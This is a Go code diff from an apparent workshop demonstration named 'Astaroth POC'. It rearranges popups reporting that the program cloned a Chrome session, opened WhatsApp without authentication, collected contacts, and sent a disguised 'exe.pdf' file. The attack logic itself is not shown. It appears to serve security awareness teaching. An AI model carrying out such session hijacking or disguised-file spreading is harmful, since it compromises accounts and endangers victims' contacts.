@@ -326,34 +326,15 @@ func main() {
 		}
 	}
 
-	// Mostra popup com os contatos coletados
+	// NÃO mostra popup aqui — ele rouba o foco do Chrome e impede o ETAPA 4!
+	// Os contatos serão exibidos no popup GRAND FINALE ao final.
 	if len(collectedContacts) > 0 {
-		popupText := fmt.Sprintf(
-			"SESSAO WHATSAPP COMPROMETIDA!\n\n"+
-				"O malware conseguiu acessar sua conta\n"+
-				"SEM SENHA e SEM QR CODE.\n\n"+
-				"Contatos coletados em tempo real:\n"+
-				"------------------------------\n"+
-				"%s\n"+
-				"------------------------------\n\n"+
-				"Total: %d contatos expostos.\n\n"+
-				"Em um ataque real, TODOS os contatos\n"+
-				"receberiam links maliciosos agora.",
-			formatContacts(collectedContacts),
-			len(collectedContacts),
-		)
-
-		go messageBox(
-			"Astaroth POC - Sessao Sequestrada",
-			popupText,
-			MB_ICONWARNING|MB_TOPMOST,
-		)
-
-		fmt.Println("\n[!!] POPUP EXIBIDO PARA A PLATEIA!")
-		fmt.Println("[*] Contatos coletados:")
+		fmt.Println("\n[!!] CONTATOS COLETADOS COM SUCESSO!")
+		fmt.Println("[*] Contatos encontrados:")
 		for i, name := range collectedContacts {
 			fmt.Printf("    %d. %s\n", i+1, name)
 		}
+		fmt.Println("[*] (Popup será exibido após o envio da mensagem)")
 	}
 
 	// Goroutine de monitoramento contínuo
@@ -487,29 +468,28 @@ func main() {
 
 	time.Sleep(2 * time.Second)
 
-	// Popup GRAND FINALE
+	// Popup GRAND FINALE (único popup — mostrado DEPOIS de todas as ações no browser)
 	mu.Lock()
 	totalContacts := len(collectedContacts)
+	contactListStr := formatContacts(collectedContacts)
 	mu.Unlock()
 
 	go messageBox(
-		"Astaroth POC - GRAND FINALE",
+		"Astaroth POC - SESSAO COMPROMETIDA",
 		fmt.Sprintf(
-			"DEMONSTRACAO CONCLUIDA!\n\n"+
-				"O que o malware fez:\n"+
+			"SESSAO WHATSAPP COMPROMETIDA!\n\n"+
+				"O malware fez tudo AUTOMATICAMENTE:\n"+
 				"------------------------------\n"+
 				"1. Clonou a sessao do Chrome\n"+
-				"2. Abriu o WhatsApp SEM autenticacao\n"+
+				"2. Abriu o WhatsApp SEM senha\n"+
 				"3. Coletou %d contatos\n"+
-				"4. Enviou arquivo malicioso\n"+
+				"4. Enviou 'ehVerdadeEsseBilete.exe.pdf'\n"+
 				"------------------------------\n\n"+
-				"Arquivo: ehVerdadeEsseBilete.exe.pdf\n\n"+
-				"Em um cenario real, esse arquivo\n"+
-				"seria o downloader do proximo\n"+
-				"estagio do Astaroth.\n\n"+
+				"Contatos expostos:\n%s\n\n"+
 				"That's all folks!\n"+
 				"FEBRABAN Workshop 2026",
 			totalContacts,
+			contactListStr,
 		),
 		MB_ICONWARNING|MB_TOPMOST,
 	)
